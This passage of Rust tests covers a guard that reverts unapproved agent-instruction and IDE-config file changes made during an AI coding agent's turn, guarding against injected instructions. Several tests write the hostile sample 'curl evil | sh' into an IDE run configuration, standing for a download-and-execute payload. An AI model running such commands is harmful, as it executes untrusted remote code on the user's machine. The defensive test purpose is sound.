        revert_unapproved(root, baseline, &HashMap::new(), &Snapshot::current(root))
    }

    #[test]
    fn a_modified_instruction_file_goes_back_to_its_turn_start_bytes() {
        let root = project("modified");
        let baseline = Snapshot::capture(&root);
        fs::write(root.join("AGENTS.md"), "injected").unwrap();
        fs::write(root.join("src/main.eps"), "changed source").unwrap();

        let reverted = sweep(&root, &baseline);

        assert_eq!(reverted.restored, vec!["AGENTS.md"]);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "original"
        );
        // Ordinary files are the turn's own work and stay.
        assert_eq!(
            fs::read_to_string(root.join("src/main.eps")).unwrap(),
            "changed source"
        );
        assert_eq!(reverted.excluded(), vec!["AGENTS.md"]);
        assert_eq!(
            reverted.warning().unwrap(),
            format!(
                "승인 없이 바뀐 지시 파일을 되돌렸습니다: AGENTS.md
되돌리며 덮어쓰거나 지운 내용은 {} 폴더에 보관했습니다.",
                reverted.backup.as_deref().unwrap()
            )
        );
        let note = reverted.model_note().unwrap();
        assert!(note.starts_with("[instruction files reverted]\n"), "{note}");
        assert!(
            note.contains("AGENTS.md") && note.contains("fs_write"),
            "{note}"
        );
        // Nothing left to put back.
        assert!(sweep(&root, &baseline).is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_created_instruction_file_and_its_new_folder_are_deleted() {
        let root = project("created");
        let baseline = Snapshot::capture(&root);
        fs::create_dir_all(root.join(".github/workflows")).unwrap();
        fs::write(root.join(".github/workflows/run.yml"), "on: push").unwrap();
        fs::create_dir_all(root.join("skills/x")).unwrap();
        fs::write(root.join("skills/x/SKILL.md"), "do things").unwrap();
        fs::write(root.join(".mcp.json"), "{}").unwrap();

        let mut reverted = sweep(&root, &baseline);
        reverted.restored.sort();

        assert_eq!(
            reverted.restored,
            vec![
                ".github",
                ".github/workflows",
                ".github/workflows/run.yml",
                ".mcp.json",
                "skills/x/SKILL.md"
            ]
        );
        assert!(!root.join(".github").exists());
        assert!(!root.join(".mcp.json").exists());
        assert!(!root.join("skills/x/SKILL.md").exists());
        // A folder that is not itself an instruction path is left.
        assert!(root.join("skills/x").is_dir());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn the_claude_folder_is_swept_like_any_instruction_folder() {
        let root = project("claude");
        let baseline = Snapshot::capture(&root);
        fs::create_dir_all(root.join(".claude")).unwrap();
        fs::write(root.join(".claude/settings.json"), "{}").unwrap();

        let reverted = sweep(&root, &baseline);

        assert!(reverted
            .restored
            .contains(&".claude/settings.json".to_string()));
        assert!(!root.join(".claude").exists());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_change_through_another_spelling_is_caught_on_the_real_entry() {
        let root = project("case");
        fs::create_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("docs/Claude.md"), "nested original").unwrap();
        let baseline = Snapshot::capture(&root);
        // Written through whatever spelling reaches the file: on a
        // case-insensitive volume this is the same entry.
        let spelled = if cfg!(any(windows, target_os = "macos")) {
            root.join("docs/CLAUDE.MD")
        } else {
            root.join("docs/Claude.md")
        };
        fs::write(spelled, "nested injected").unwrap();
        // A brand-new file in yet another case is found too.
        fs::write(root.join("Gemini.Md"), "new").unwrap();

        let mut reverted = sweep(&root, &baseline);
        reverted.restored.sort();

        assert_eq!(reverted.restored, vec!["Gemini.Md", "docs/Claude.md"]);
        assert_eq!(
            fs::read_to_string(root.join("docs/Claude.md")).unwrap(),
            "nested original"
        );
        assert!(!root.join("Gemini.Md").exists());
        fs::remove_dir_all(root).ok();
    }

    #[cfg(windows)]
    #[test]
    fn a_change_through_an_8_3_short_name_is_caught_on_the_real_entry() {
        let root = project("short-name");
        fs::write(root.join("CLAUDE.local.md"), "original").unwrap();
        let baseline = Snapshot::capture(&root);
        let short = root.join("CLAUDE~1.MD");
        if fs::read_to_string(&short).ok().as_deref() != Some("original") {
            eprintln!("skipping: this volume does not generate 8.3 short names");
            fs::remove_dir_all(root).ok();
            return;
        }
        fs::write(&short, "injected").unwrap();

        let reverted = sweep(&root, &baseline);

        assert_eq!(reverted.restored, vec!["CLAUDE.local.md"]);
        assert_eq!(
            fs::read_to_string(root.join("CLAUDE.local.md")).unwrap(),
            "original"
        );
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn the_newest_allowed_content_is_kept_and_restored_over_later_changes() {
        let root = project("approved");
        let baseline = Snapshot::capture(&root);
        fs::write(root.join("AGENTS.md"), "approved").unwrap();
        let approved = ApprovedContent::read(&root, "AGENTS.md").unwrap();
        let approved =
            HashMap::from([(crate::git::path_key("AGENTS.md"), Settled::from(approved))]);

        assert!(
            revert_unapproved(&root, &baseline, &approved, &Snapshot::current(&root)).is_empty()
        );
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "approved"
        );

        // A later unapproved change goes back to what the user allowed.
        fs::write(root.join("AGENTS.md"), "approved, then injected").unwrap();
        let reverted = revert_unapproved(&root, &baseline, &approved, &Snapshot::current(&root));
        assert_eq!(reverted.restored, vec!["AGENTS.md"]);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "approved"
        );
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn another_requests_allowed_write_is_kept_by_this_turns_sweep() {
        let root = project("other-request");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        // Another session of the project writes CLAUDE.md with its card.
        fs::write(root.join("CLAUDE.md"), "allowed elsewhere").unwrap();
        writes.record_instruction_write(
            "eps:project",
            "CLAUDE.md",
            ApprovedContent::read(&root, "CLAUDE.md").unwrap(),
        );
        // A write allowed in another project's scope protects nothing here.
        fs::write(root.join("GEMINI.md"), "unapproved").unwrap();
        writes.record_instruction_write(
            "eps:other",
            "GEMINI.md",
            ApprovedContent::read(&root, "GEMINI.md").unwrap(),
        );

        let sweep = guard.sweep(&root, &writes, "eps:project", &Snapshot::current(&root));

        assert_eq!(sweep.report.restored, vec!["GEMINI.md"]);
        assert_eq!(
            fs::read_to_string(root.join("CLAUDE.md")).unwrap(),
            "allowed elsewhere"
        );
        assert!(!root.join("GEMINI.md").exists());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_allowed_write_from_before_the_turn_does_not_override_its_baseline() {
        let root = project("older-approval");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        writes.record_instruction_write(
            "eps:project",
            "AGENTS.md",
            ApprovedContent::read(&root, "AGENTS.md").unwrap(),
        );
        // The user edits the file by hand between turns.
        fs::write(root.join("AGENTS.md"), "user edit").unwrap();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(root.join("AGENTS.md"), "injected").unwrap();

        let sweep = guard.sweep(&root, &writes, "eps:project", &Snapshot::current(&root));

        assert_eq!(sweep.report.restored, vec!["AGENTS.md"]);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "user edit"
        );
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_unrestorable_change_is_excluded_and_reported_once() {
        let root = project("unrestorable");
        let baseline_guard_root = root.clone();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&baseline_guard_root, &writes, "eps:project");
        // The file is replaced by a folder of the same name.
        fs::remove_file(root.join("AGENTS.md")).unwrap();
        fs::create_dir(root.join("AGENTS.md")).unwrap();
        fs::write(root.join("AGENTS.md/inner.txt"), "x").unwrap();

        let first = guard.sweep(&root, &writes, "eps:project", &Snapshot::current(&root));
        assert_eq!(first.excluded, vec!["AGENTS.md"]);
        assert_eq!(first.report.failed.len(), 1);
        assert!(first
            .report
            .warning()
            .unwrap()
            .starts_with("승인 없이 바뀐 지시 파일을 되돌리지 못해"));

        let second = guard.sweep(&root, &writes, "eps:project", &Snapshot::current(&root));
        assert_eq!(second.excluded, vec!["AGENTS.md"]);
        assert!(second.report.is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_link_is_never_followed_by_the_scan_or_the_restore() {
        let root = project("link");
        let outside = std::env::temp_dir().join(format!(
            "eud-agent-instruction-guard-outside-{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join("AGENTS.md"), "outside").unwrap();
        fs::create_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("docs/AGENTS.md"), "nested original").unwrap();
        let baseline = Snapshot::capture(&root);

        // `docs` becomes a link to the outside folder.
        fs::remove_dir_all(root.join("docs")).unwrap();
        #[cfg(windows)]
        let linked = std::os::windows::fs::symlink_dir(&outside, root.join("docs")).is_ok()
            || std::process::Command::new("cmd")
                .args(["/C", "mklink", "/J"])
                .arg(root.join("docs"))
                .arg(&outside)
                .output()
                .is_ok_and(|output| output.status.success());
        #[cfg(unix)]
        let linked = std::os::unix::fs::symlink(&outside, root.join("docs")).is_ok();
        if !linked {
            eprintln!("skipping: this machine cannot create a link");
            fs::remove_dir_all(root).ok();
            fs::remove_dir_all(outside).ok();
            return;
        }

        let reverted = sweep(&root, &baseline);

        // The restore refuses to write through the link; the outside file
        // is untouched and the path is reported and left out of the commit.
        assert_eq!(reverted.failed.len(), 1, "{reverted:?}");
        assert_eq!(reverted.failed[0].0, "docs/AGENTS.md");
        assert_eq!(
            fs::read_to_string(outside.join("AGENTS.md")).unwrap(),
            "outside"
        );
        assert!(reverted.excluded().contains(&"docs/AGENTS.md".to_string()));
        let _ = fs::remove_dir(root.join("docs")).or_else(|_| fs::remove_file(root.join("docs")));
        fs::remove_dir_all(root).ok();
        fs::remove_dir_all(outside).ok();
    }

    #[test]
    fn a_created_link_in_an_instruction_path_is_removed_as_a_link() {
        let root = project("created-link");
        let outside = std::env::temp_dir().join(format!(
            "eud-agent-instruction-guard-target-{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join("keep.txt"), "keep").unwrap();
        let baseline = Snapshot::capture(&root);
        #[cfg(windows)]
        let linked = std::os::windows::fs::symlink_dir(&outside, root.join(".codex")).is_ok()
            || std::process::Command::new("cmd")
                .args(["/C", "mklink", "/J"])
                .arg(root.join(".codex"))
                .arg(&outside)
                .output()
                .is_ok_and(|output| output.status.success());
        #[cfg(unix)]
        let linked = std::os::unix::fs::symlink(&outside, root.join(".codex")).is_ok();
        if !linked {
            eprintln!("skipping: this machine cannot create a link");
            fs::remove_dir_all(root).ok();
            fs::remove_dir_all(outside).ok();
            return;
        }

        let reverted = sweep(&root, &baseline);

        assert_eq!(reverted.restored, vec![".codex"]);
        assert!(fs::symlink_metadata(root.join(".codex")).is_err());
        assert_eq!(
            fs::read_to_string(outside.join("keep.txt")).unwrap(),
            "keep"
        );
        fs::remove_dir_all(root).ok();
        fs::remove_dir_all(outside).ok();
    }

    #[test]
    fn an_incomplete_baseline_leaves_unknown_files_in_place() {
        let root = project("incomplete");
        let mut baseline = Snapshot::capture(&root);
        baseline.complete = false;
        fs::write(root.join("CLAUDE.md"), "maybe old").unwrap();

        let reverted = sweep(&root, &baseline);

        assert_eq!(reverted.unchecked, vec!["CLAUDE.md"]);
        assert!(root.join("CLAUDE.md").exists());
        assert_eq!(reverted.excluded(), vec!["CLAUDE.md"]);
        assert!(reverted.model_note().is_none());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_long_list_is_bounded() {
        let reverted = Reverted {
            restored: (0..25).map(|n| format!("d{n}/AGENTS.md")).collect(),
            ..Reverted::default()
        };
        let warning = reverted.warning().unwrap();
        assert!(warning.ends_with(" 외 5개"), "{warning}");
        assert!(!warning.contains("d20/"), "{warning}");
    }

    fn guard_sweep(
        guard: &mut InstructionGuard,
        root: &Path,
        writes: &crate::write_coordinator::ProjectWriteCoordinator,
    ) -> Sweep {
        guard.sweep(root, writes, "eps:project", &Snapshot::current(root))
    }

    #[test]
    fn overlapping_turns_never_put_back_what_the_other_sweep_restored() {
        let root = project("overlap");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        // B's turn starts, then injects AGENTS.md through a shell.
        let mut b = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(root.join("AGENTS.md"), "injected").unwrap();
        // A's turn starts now and takes the injected bytes as its baseline.
        let mut a = InstructionGuard::capture(&root, &writes, "eps:project");

        let b_sweep = guard_sweep(&mut b, &root, &writes);
        assert_eq!(b_sweep.report.restored, vec!["AGENTS.md"]);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "original"
        );

        // A's sweep keeps what B's sweep settled on, and reports nothing.
        let a_sweep = guard_sweep(&mut a, &root, &writes);
        assert!(a_sweep.report.is_empty(), "{:?}", a_sweep.report);
        assert!(a_sweep.excluded.is_empty(), "{:?}", a_sweep.excluded);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "original"
        );
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_file_another_sweep_deleted_is_not_recreated() {
        let root = project("tombstone");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut b = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(root.join("CLAUDE.md"), "injected").unwrap();
        let mut a = InstructionGuard::capture(&root, &writes, "eps:project");

        assert_eq!(
            guard_sweep(&mut b, &root, &writes).report.restored,
            vec!["CLAUDE.md"]
        );
        let settled = writes.instruction_writes_since("eps:project", 0);
        assert!(settled[&crate::git::path_key("CLAUDE.md")].is_absent());

        assert!(guard_sweep(&mut a, &root, &writes).report.is_empty());
        assert!(!root.join("CLAUDE.md").exists());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_incomplete_end_scan_never_rewrites_what_it_did_not_reach() {
        let root = project("incomplete-end");
        fs::create_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("docs/AGENTS.md"), "nested").unwrap();
        fs::write(root.join("GEMINI.md"), "gone soon").unwrap();
        let baseline = Snapshot::capture(&root);
        // `docs` becomes a file, so `docs/AGENTS.md` cannot be examined;
        // GEMINI.md is really deleted; AGENTS.md is untouched.
        fs::remove_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("docs"), "now a file").unwrap();
        fs::remove_file(root.join("GEMINI.md")).unwrap();
        // The end scan stopped before reaching any of them.
        let mut current = Snapshot::current(&root);
        current.entries.clear();
        current.complete = false;

        let reverted = revert_unapproved(&root, &baseline, &HashMap::new(), &current);

        // Each baseline path was read directly: the untouched one is left
        // alone, the deleted one comes back, and the one behind a file is
        // unchecked, never created.
        assert_eq!(reverted.restored, vec!["GEMINI.md"]);
        assert_eq!(reverted.unchecked, vec!["docs/AGENTS.md"]);
        assert!(reverted.incomplete);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "original"
        );
        assert_eq!(
            fs::read_to_string(root.join("GEMINI.md")).unwrap(),
            "gone soon"
        );
        assert!(root.join("docs").is_file());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn what_a_revert_overwrites_or_deletes_is_kept_first() {
        let root = project("backup");
        let baseline = Snapshot::capture(&root);
        fs::write(root.join("AGENTS.md"), "injected").unwrap();
        fs::write(root.join(".mcp.json"), "{\"servers\":1}").unwrap();

        let reverted = sweep(&root, &baseline);

        let backup = reverted.backup.clone().expect("a backup folder");
        assert!(backup.starts_with(&format!("{BACKUP_DIR}/")), "{backup}");
        assert_eq!(
            fs::read_to_string(root.join(&backup).join("AGENTS.md")).unwrap(),
            "injected"
        );
        assert_eq!(
            fs::read_to_string(root.join(&backup).join(".mcp.json")).unwrap(),
            "{\"servers\":1}"
        );
        let warning = reverted.warning().unwrap();
        assert!(warning.contains(&backup), "{warning}");
        // The kept copies are the guard's own: never scanned as
        // instruction files, never committed.
        assert!(sweep(&root, &baseline).is_empty());
        assert!(is_guard_own_path(&format!("{backup}/AGENTS.md")));
        assert!(is_guard_own_path(".claude/.settings.json.1234.eud-restore"));
        assert!(!is_guard_own_path(".eud-agent/state/other.json"));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn without_a_backup_nothing_is_overwritten_or_deleted() {
        let root = project("backup-blocked");
        let baseline = Snapshot::capture(&root);
        fs::write(root.join("AGENTS.md"), "injected").unwrap();
        fs::write(root.join("GEMINI.md"), "created").unwrap();
        // The backup folder cannot be made: a file holds its name.
        fs::create_dir_all(root.join(".eud-agent/state")).unwrap();
        fs::write(root.join(BACKUP_DIR), "blocking").unwrap();

        let mut reverted = sweep(&root, &baseline);
        reverted.failed.sort();

        assert!(reverted.restored.is_empty(), "{reverted:?}");
        assert_eq!(
            reverted
                .failed
                .iter()
                .map(|(path, _)| path.as_str())
                .collect::<Vec<_>>(),
            vec!["AGENTS.md", "GEMINI.md"]
        );
        assert!(reverted.failed[0].1.contains("보관하지 못해"));
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "injected"
        );
        assert!(root.join("GEMINI.md").exists());
        assert!(reverted.backup.is_none());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_path_left_in_place_is_held_out_of_commits_until_it_changes() {
        let root = project("held");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::remove_file(root.join("AGENTS.md")).unwrap();
        fs::create_dir(root.join("AGENTS.md")).unwrap();
        fs::write(root.join("AGENTS.md/inner.txt"), "x").unwrap();

        let swept = guard_sweep(&mut guard, &root, &writes);
        assert_eq!(swept.excluded, vec!["AGENTS.md"]);
        // The next turn's baseline would accept it; the hold keeps it out.
        assert_eq!(held_paths(&root, &writes, "eps:project"), vec!["AGENTS.md"]);
        let mut next = InstructionGuard::capture(&root, &writes, "eps:project");
        assert_eq!(
            guard_sweep(&mut next, &root, &writes).excluded,
            vec!["AGENTS.md"]
        );
        assert!(held_warning(&["AGENTS.md".to_string()])
            .unwrap()
            .contains("AGENTS.md"));

        // Once something changes it, it is released.
        fs::remove_dir_all(root.join("AGENTS.md")).unwrap();
        fs::write(root.join("AGENTS.md"), "fixed by the user").unwrap();
        assert!(held_paths(&root, &writes, "eps:project").is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_history_revert_is_kept_by_a_running_turns_sweep() {
        let root = project("revert");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        // The user's git_revert rewrites AGENTS.md while the turn runs.
        fs::write(root.join("AGENTS.md"), "reverted").unwrap();
        settle_paths(
            &root,
            &writes,
            "eps:project",
            ["AGENTS.md".to_string(), "src/main.eps".to_string()],
        );

        assert!(guard_sweep(&mut guard, &root, &writes).report.is_empty());
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "reverted"
        );
        let settled = writes.instruction_writes_since("eps:project", 0);
        assert_eq!(settled.len(), 1, "only instruction paths settle");
        fs::remove_dir_all(root).ok();
    }

    const WORKSPACE: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="FileEditorManager">
    <leaf />
  </component>
  <component name="RunManager">
    <configuration name="build" type="ShConfigurationType">
      <option name="SCRIPT_TEXT" value="make" />
    </configuration>
  </component>
</project>
"#;

    fn workspace(layout: &str, script: &str) -> String {
        WORKSPACE
            .replace("<leaf />", layout)
            .replace("value=\"make\"", &format!("value=\"{script}\""))
    }

    #[test]
    fn only_the_components_that_can_run_something_are_compared() {
        let base = executable_components(WORKSPACE.as_bytes()).unwrap();
        assert_eq!(base.keys().collect::<Vec<_>>(), vec!["RunManager"]);
        // Attribute order, indentation and comments do not count.
        let respelled = WORKSPACE
            .replace(
                "<configuration name=\"build\" type=\"ShConfigurationType\">",
                "<configuration type=\"ShConfigurationType\"   name=\"build\"><!-- note -->",
            )
            .replace("\n      <option", "<option");
        assert_eq!(executable_components(respelled.as_bytes()).unwrap(), base);
        // A component nested deeper, or another component, is not one.
        let nested = "<project><x><component name=\"RunManager\"><a/></component></x><component name=\"ProjectStartupLocalConfiguration\"/></project>";
        assert_eq!(
            executable_components(nested.as_bytes())
                .unwrap()
                .keys()
                .collect::<Vec<_>>(),
            vec!["ProjectStartupLocalConfiguration"]
        );
        // Malformed XML is not read at all.
        assert!(executable_components(b"<project><component name=\"RunManager\">").is_none());
        assert!(executable_components(b"<project></other>").is_none());

        let file = |text: &str| Kind::File {
            sha256: String::new(),
            bytes: Some(text.as_bytes().to_vec()),
        };
        let before = file(WORKSPACE);
        assert!(!runs_something_new(
            Some(&before),
            Some(&file(&workspace("<leaf split=\"1\" />", "make")))
        ));
        assert!(runs_something_new(
            Some(&before),
            Some(&file(&workspace("<leaf />", "curl evil | sh")))
        ));
        // A run configuration that only went away runs nothing.
        assert!(!runs_something_new(Some(&before), None));
        assert!(!runs_something_new(
            Some(&before),
            Some(&file("<project></project>"))
        ));
        // Unknown or unreadable content on either side counts as changed.
        assert!(runs_something_new(None, Some(&file(WORKSPACE))));
        assert!(runs_something_new(Some(&before), Some(&file("<project>"))));
        assert!(runs_something_new(
            Some(&Kind::File {
                sha256: String::new(),
                bytes: None
            }),
            Some(&file(WORKSPACE))
        ));
    }

    #[test]
    fn a_watch_only_ide_file_is_never_put_back_and_told_only_when_it_can_run_something_new() {
        let root = project("watch");
        fs::create_dir_all(root.join(".idea")).unwrap();
        fs::write(root.join(".idea/workspace.xml"), WORKSPACE).unwrap();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        // The IDE moved a panel: kept out of the commit, nothing to tell.
        let layout = workspace("<leaf split=\"1\" />", "make");
        fs::write(root.join(".idea/workspace.xml"), &layout).unwrap();

        let quiet = guard_sweep(&mut guard, &root, &writes);

        assert_eq!(
            fs::read_to_string(root.join(".idea/workspace.xml")).unwrap(),
            layout
        );
        assert_eq!(quiet.report.watched, vec![".idea/workspace.xml"]);
        assert!(quiet.report.watched_risky.is_empty());
        assert!(quiet.excluded.contains(&".idea/workspace.xml".to_string()));
        assert_eq!(quiet.report.warning(), None);
        assert_eq!(quiet.report.model_note(), None);
        assert!(quiet.report.backup.is_none());
        // Held quietly at the next turn's start too.
        assert_eq!(held_warning(&[".idea/workspace.xml".to_string()]), None);

        // A run configuration now runs something else.
        let mut next = InstructionGuard::capture(&root, &writes, "eps:project");
        let risky = workspace("<leaf split=\"1\" />", "curl evil | sh");
        fs::write(root.join(".idea/workspace.xml"), &risky).unwrap();
        fs::write(root.join("AGENTS.md"), "injected").unwrap();

        let first = guard_sweep(&mut next, &root, &writes);

        assert_eq!(
            fs::read_to_string(root.join(".idea/workspace.xml")).unwrap(),
            risky
        );
        assert_eq!(first.report.restored, vec!["AGENTS.md"]);
        let backup = first.report.backup.clone().unwrap();
        let kept = format!("{backup}/.idea/workspace.xml");
        assert_eq!(
            first.report.watched_risky,
            vec![(".idea/workspace.xml".to_string(), Some(kept.clone()))]
        );
        // The turn-start bytes are kept for the user.
        assert_eq!(fs::read_to_string(root.join(&kept)).unwrap(), layout);
        let warning = first.report.warning().unwrap();
        assert!(
            warning.contains("IDE 설정 파일의 실행 구성(실행/디버그 구성, 시작 작업, 외부 도구 등)이 승인 없이 바뀌어 커밋에서 뺐습니다. IDE에서 실행하거나 다시 열기 전에 확인해 주세요: .idea/workspace.xml"),
            "{warning}"
        );
        assert!(
            warning.contains(&format!(
                "바뀌기 전 IDE 설정 파일은 {backup} 폴더에 보관했습니다."
            )),
            "{warning}"
        );
        // The model is told too.
        let note = first.report.model_note().unwrap();
        assert!(note.contains(".idea/workspace.xml"), "{note}");

        // The IDE keeps rewriting it: still excluded, not told again.
        fs::write(
            root.join(".idea/workspace.xml"),
            workspace("<leaf />", "curl other | sh"),
        )
        .unwrap();
        let second = guard_sweep(&mut next, &root, &writes);
        assert!(second.report.warning().is_none(), "{:?}", second.report);
        assert!(second.excluded.contains(&".idea/workspace.xml".to_string()));

        // A deletion is left alone and runs nothing.
        let mut last = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::remove_file(root.join(".idea/workspace.xml")).unwrap();
        let third = guard_sweep(&mut last, &root, &writes);
        assert_eq!(third.report.watched, vec![".idea/workspace.xml"]);
        assert!(third.report.watched_risky.is_empty());
        assert!(!root.join(".idea/workspace.xml").exists());

        // A file that appears with a run configuration has no turn-start
        // bytes to keep, and says so.
        let mut fresh = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(root.join(".idea/workspace.xml"), WORKSPACE).unwrap();
        let created = guard_sweep(&mut fresh, &root, &writes);
        assert_eq!(
            created.report.watched_risky,
            vec![(".idea/workspace.xml".to_string(), None)]
        );
        assert!(created.report.warning().unwrap().contains(
            "바뀌기 전 내용이 없거나 알 수 없어 보관하지 못한 IDE 설정 파일: .idea/workspace.xml"
        ));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_watch_only_file_git_ignores_is_never_held_but_told_when_it_can_run_something_new() {
        if !crate::git::available() {
            eprintln!("skipping ignored watch file: git is not installed on this machine");
            return;
        }
        let root = project("watch-ignored");
        fs::create_dir_all(root.join(".idea")).unwrap();
        fs::write(root.join(".idea/workspace.xml"), WORKSPACE).unwrap();
        fs::write(root.join(".gitignore"), ".idea/workspace.xml\n").unwrap();
        assert!(crate::git::prepare(&root).auto_commit_allowed());
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();

        // A layout rewrite: nothing to hold, keep out, or tell.
        let mut quiet = InstructionGuard::capture(&root, &writes, "eps:project");
        let layout = workspace("<leaf split=\"1\" />", "make");
        fs::write(root.join(".idea/workspace.xml"), &layout).unwrap();
        let swept = guard_sweep(&mut quiet, &root, &writes);
        assert!(swept.report.is_empty(), "{:?}", swept.report);
        assert!(swept.report.warning().is_none());
        assert!(swept.report.model_note().is_none());
        assert!(!swept.excluded.contains(&".idea/workspace.xml".to_string()));

        // A run configuration now runs something else: no commit would take
        // it, but the IDE runs it, so it is backed up and told once.
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        let risky = workspace("<leaf split=\"1\" />", "curl evil | sh");
        fs::write(root.join(".idea/workspace.xml"), &risky).unwrap();
        let swept = guard_sweep(&mut guard, &root, &writes);

        assert_eq!(
            fs::read_to_string(root.join(".idea/workspace.xml")).unwrap(),
            risky
        );
        assert!(swept.report.watched.is_empty(), "{:?}", swept.report);
        let backup = swept.report.backup.clone().unwrap();
        let kept = format!("{backup}/.idea/workspace.xml");
        assert_eq!(
            swept.report.watched_risky,
            vec![(".idea/workspace.xml".to_string(), Some(kept.clone()))]
        );
        assert_eq!(fs::read_to_string(root.join(&kept)).unwrap(), layout);
        let warning = swept.report.warning().unwrap();
        assert!(
            warning.contains("IDE 설정 파일의 실행 구성(실행/디버그 구성, 시작 작업, 외부 도구 등)이 승인 없이 바뀌었습니다. git이 커밋하지 않는 파일이라 그대로 두었습니다. IDE에서 실행하거나 다시 열기 전에 확인해 주세요: .idea/workspace.xml"),
            "{warning}"
        );
        assert!(!warning.contains("커밋에서 뺐습니다"), "{warning}");
        let note = swept.report.model_note().unwrap();
        assert!(note.contains(".idea/workspace.xml"), "{note}");
        assert!(!swept.excluded.contains(&".idea/workspace.xml".to_string()));
        assert!(writes.held_instruction_paths("eps:project").is_empty());

        // Told once per turn.
        let again = guard_sweep(&mut guard, &root, &writes);
        assert!(again.report.warning().is_none(), "{:?}", again.report);
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn the_jetbrains_startup_task_list_goes_back_like_any_instruction_file() {
        let root = project("startup-xml");
        fs::create_dir_all(root.join(".idea")).unwrap();
        fs::write(root.join(".idea/startup.xml"), "<project/>").unwrap();
        let baseline = Snapshot::capture(&root);
        fs::write(root.join(".idea/startup.xml"), "<project>evil</project>").unwrap();

        let reverted = sweep(&root, &baseline);

        assert_eq!(reverted.restored, vec![".idea/startup.xml"]);
        assert_eq!(
            fs::read_to_string(root.join(".idea/startup.xml")).unwrap(),
            "<project/>"
        );
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_held_watch_state_is_read_back_only_for_a_watch_only_path() {
        let root = project("held-watch-state");
        fs::create_dir_all(root.join(".eud-agent/state")).unwrap();
        fs::write(
            root.join(HELD_FILE),
            r#"[{"path":"AGENTS.md","state":"watch"},{"path":".idea/workspace.xml","state":"watch"},{"path":"CLAUDE.md","state":"absent"}]"#,
        )
        .unwrap();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        load_held(&root, &writes, "eps:project");
        let mut held: Vec<String> = writes
            .held_instruction_paths("eps:project")
            .into_iter()
            .map(|(path, _)| path)
            .collect();
        held.sort();
        // A plain instruction file is never held by a dirty state.
        assert_eq!(held, vec![".idea/workspace.xml", "CLAUDE.md"]);
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_closing_project_keeps_what_its_last_running_guard_still_needs() {
        let root = project("closing");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let scope = "eps:project";
        let first = InstructionGuard::capture(&root, &writes, scope);
        let mut second = InstructionGuard::capture(&root, &writes, scope);
        // The user approved a new AGENTS.md on the card.
        fs::write(root.join("AGENTS.md"), "approved").unwrap();
        record_approved(
            &root,
            &writes,
            scope,
            "AGENTS.md",
            ApprovedContent::read(&root, "AGENTS.md").unwrap(),
        );

        // The project closes while both turns' sweeps are still to come.
        writes.release_project(&[scope.to_string(), "map:project".to_string()]);
        assert!(writes.instruction_scope_closing(scope));
        drop(first);
        assert!(writes.instruction_scope_closing(scope));

        // The late sweep still sees the approved write and keeps it.
        let swept = guard_sweep(&mut second, &root, &writes);
        assert!(swept.report.restored.is_empty(), "{:?}", swept.report);
        assert_eq!(
            fs::read_to_string(root.join("AGENTS.md")).unwrap(),
            "approved"
        );

        // Its guard was the last: the scope forgets everything, and an open
        // reads its held paths back from the project again.
